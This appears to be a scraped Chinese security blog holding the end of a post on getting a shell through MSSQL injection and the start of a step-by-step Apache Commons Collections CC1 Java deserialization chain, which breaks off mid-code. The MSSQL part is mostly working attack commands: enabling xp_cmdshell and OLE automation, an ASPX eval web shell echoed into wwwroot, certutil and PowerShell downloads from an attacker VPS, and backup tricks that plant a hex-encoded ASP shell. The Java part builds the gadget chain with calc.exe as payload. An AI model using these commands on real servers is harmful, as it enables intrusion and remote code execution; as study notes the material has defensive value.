<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>
<img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/6.png" alt="6"><br>此方法无回显</li>
</ul>
<h3 id="openrowset"><a href="#openrowset" class="headerlink" title="openrowset"></a>openrowset</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 开启 Ad Hoc Distributed Queries 组件</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;,1 reconfigure exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1 reconfigure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from openrowset(&#39;sqloledb&#39;,&#39;dsn&#x3D;locaserver;trusted_connection&#x3D;yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;dir c:&#39;&#39;with RESULT SETS((a varchar(max)))&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><ul>
<li><p>不出网的情况写dns马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-- 开启权限（开启这2个权限后才能写文件）</span><br><span class="line">-- 开启</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;</span><br><span class="line">--关毕</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;</span><br><span class="line">--写文件 这里@FilePath 是路径，@STR_CONTENT 是内容，整理流程是先创建在写入。t-sql读写文件</span><br><span class="line">declare @FilePath nvarchar(400),@xmlstr varchar(8000);</span><br><span class="line">Declare @INT_ERR int;</span><br><span class="line">Declare @INT_FSO int;</span><br><span class="line">Declare @INT_OPENFILE int;</span><br><span class="line">Declare @STR_CONTENT as varchar(MAX);</span><br><span class="line">DECLARE @output varchar(255);</span><br><span class="line">DECLARE @hr int;</span><br><span class="line">DECLARE @source varchar(255);</span><br><span class="line">DECLARE @description varchar(255);</span><br><span class="line">set @FilePath &#x3D; &#39;c:&#x2F;windows&#x2F;tasks&#x2F;111.txt&#39;;</span><br><span class="line">set @STR_CONTENT &#x3D; convert(varchar(MAX),0x313233);     &#x2F;&#x2F;  base64-&gt;hackbar转16</span><br><span class="line">EXEC @INT_ERR &#x3D; sp_OACreate &#39;Scripting.FileSystemObject&#39;, @INT_FSO OUTPUT;</span><br><span class="line">if(@INT_ERR &lt;&gt; 0) BEGIN EXEC sp_OAGetErrorInfo @INT_FSO RETURN END;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OAMETHOD @INT_FSO,&#39;CreateTextFile&#39;,@INT_OPENFILE OUTPUT,@FilePath;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OAMETHOD @INT_OPENFILE,&#39;Write&#39;,null,@STR_CONTENT;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OADESTROY @INT_OPENFILE;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/7.png" alt="7"></p>
</li>
<li><p>出网</p>
</li>
</ul>
<ol>
<li>找路径   利用命令执行找web路径for /r D:\ %i in (*flag.php) do @echo %i&gt;%i.txt</li>
<li>echo 写shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt; ^&lt;% eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;); %^&gt;&gt; C:\inetpub\wwwroot\a.aspx</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>文件下载写shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;vps&#x2F;a.txt D:\a.txt</span><br><span class="line">powershell -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;vps&#x2F;a.txt&#39;, &#39;D:\a.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>
sp_oacreate写文件，如上</li>
</ul>
<h3 id="不能执行命令的情况"><a href="#不能执行命令的情况" class="headerlink" title="不能执行命令的情况"></a>不能执行命令的情况</h3><h4 id="差异备份getshell"><a href="#差异备份getshell" class="headerlink" title="差异备份getshell"></a>差异备份getshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk &#x3D; &#39;F:\bak.bak&#39;;--</span><br><span class="line">create table [dbo].[test1] ([cmd] [image]);</span><br><span class="line">insert into test1(cmd)  values(0x3C25657865637574652872657175657374282261222929253E);</span><br><span class="line">backup database test to disk&#x3D;&#39;F:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/8.png" alt="8"></p>
<p>一句话写入d.asp文件中<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/9.png" alt="9"></p>
<p>这里用不了for命令找绝对路径，可以用xp_dirtree存储过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#39;c:&#39; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1 --只列c:\目录 </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>
<p>创建临时表插入临时表查询</p>
<p><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/9.png" alt="9"></p>
<h2 id="log备份getshell"><a href="#log备份getshell" class="headerlink" title="log备份getshell"></a>log备份getshell</h2><p>比较大的限制是要求数据库备份过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alter database 库名 set RECOVERY FULL </span><br><span class="line">create table cmd (a image) </span><br><span class="line">backup log 库名 to disk &#x3D; &#39;c:\xxx&#39; with init </span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line">backup log 库名 to disk &#x3D; &#39;c:\xxx\2.asp&#39;</span><br></pre></td></tr></table></figure>
<p>ps:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for命令语法：</span><br><span class="line">for &#x2F;f “选项” %变量 in （ “字符串”-集 &#x2F;文件名-集&#x2F;  ‘命令&#39;-集  ） do 命令                                        </span><br><span class="line">读取文件内容:</span><br><span class="line">for &#x2F;F %i in (c:\windows\tasks\1.txt) do echo %i  </span><br><span class="line">执行命令，并读取结果:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ&quot; %d IN (&#96;dir&#96;) DO @ECHO %d</span><br><span class="line">读取目录名称:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ delims&#x3D;&lt;DIR&gt; tokens&#x3D;2&quot; %i in (&#96;dir c:\windows\tasks&#96;) do @ECHO %i</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ&quot; %i in (&#96;dir &#x2F;b c:\windows\tasks&#96;) do @ECHO %i  [更好]</span><br><span class="line">读取文件名:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ tokens&#x3D;4 delims&#x3D; &quot; %c in (&#96;dir c:\windows\tasks&#96;) do @ECHO %c</span><br><span class="line">这里使用了 usebackq 参数，令执行命令用&#96;包裹。</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实战的话暂时就用到这些，各种环境不同情况会加以补充。<br>告自己：不要再感到迷茫了学习就完事儿</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/02/16/cc1%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/16/cc1%E9%93%BE/" class="post-title-link" itemprop="url">cc1链</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-16 12:23:54" itemprop="dateCreated datePublished" datetime="2021-02-16T12:23:54+08:00">2021-02-16</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-03-18 22:34:57" itemprop="dateModified" datetime="2021-03-18T22:34:57+08:00">2021-03-18</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="漏洞起始点"><a href="#漏洞起始点" class="headerlink" title="漏洞起始点"></a>漏洞起始点</h2><p>关注该组件中InvokerTransformer类的transform方法，实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +  <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +  <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +  <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用该方法时会传入一个对象，参数为空返回为空，不为空时就会先得到class对象，通过calsss对象的getMethod()方法得到Method实例，再通过该实例的invoke方法实现反射调用传入对象的方法，并且查看构造方法如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三个参数都是可控的，可以借助InvokerTransformer来执行命令</p>
<p>这里注意的是Runtime实例是不能被序列化的，只能通过服务端拿到Runtime的实例。</p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>由上分析我们知道能通过InvokerTransform类的transform函数反射调用任意类的任意方法，首先我们简单的构造一下调用exec方法实现命令执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">step1</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过InvokerTransformer构造方法实例化并传入构造的参数</span></span><br><span class="line">        InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//构造input</span></span><br><span class="line">        Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line">        <span class="comment">//调用触发函数</span></span><br><span class="line">        a.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/16/cc1%E9%93%BE/1.png" alt="1"></p>
<p>这里就需要思考如何去构造一个调用链能在服务端反序列化之后自动调用，也就是找到readobject复写点以及链。</p>
<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><p>关注到ChainedTransformer类的transform函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">............</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>transform方法遍历构造函数中的Transformer类型的数组，iTransformers是我们可控的。</p>
<p>现在我们可以通过调用ChainedTransformer类的transform方法传入InvokerTransformer对象最后遍历调用触发漏洞的点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">step2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//定义一个Transformer数组,数组里封装InvokerTransformer对象</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;;</span><br><span class="line">        <span class="comment">//构造input</span></span><br><span class="line">        Object input = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line">        <span class="comment">//实例化一个ChainedTransform，传入我们构造的transform数组</span></span><br><span class="line">        ChainedTransformer ChainedTransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//调用ChainedTransformer中的transform方法</span></span><br><span class="line">        ChainedTransform.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/16/cc1%E9%93%BE/2.png" alt="2"></p>
<p>到这里input还是在外面，也就是runtime实例，需要我们自己构造。但是runtime是不支持反序列化的，这样我们就要找到一个利用类能在服务端实例化runtime。</p>
<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>此时payload还是在外面，需要转换为transform类型，找到ConstantTransformer类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的构造函数会写入这个变量，他的transform函数会返回这个变量。所以可以通过这个类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="comment">//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line">            <span class="comment">//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">            <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
<p>这里我们需要注意到input.getClass()这个方法使用上的一些区别：<br><font color="#dd0000"></font></p>
<ul>
<li>当input是一个类的实例对象时，获取到的是这个类</li>
<li>当input是一个类时，获取到的是java.lang.Class</li>
</ul>
<p>解决：<br><font color="#dd0000">在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</font></p>
<p>下面invoke里面第一个参数obj为null，是因为反射机制调用getRuntime静态类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">step3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,  Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class,  Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span>  Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer ChainedTransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        ChainedTransform.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/16/cc1%E9%93%BE/3.png" alt="3"></p>
<p>上面代码等价于</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime)Runtime.class.getMethod(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)).exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><p>绑定和触发</p>
<p>Transform来执行命令需要绑定到Map上，抽象类AbstractMapDecorator是Apache Commons Collections提供的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上，当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">step4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                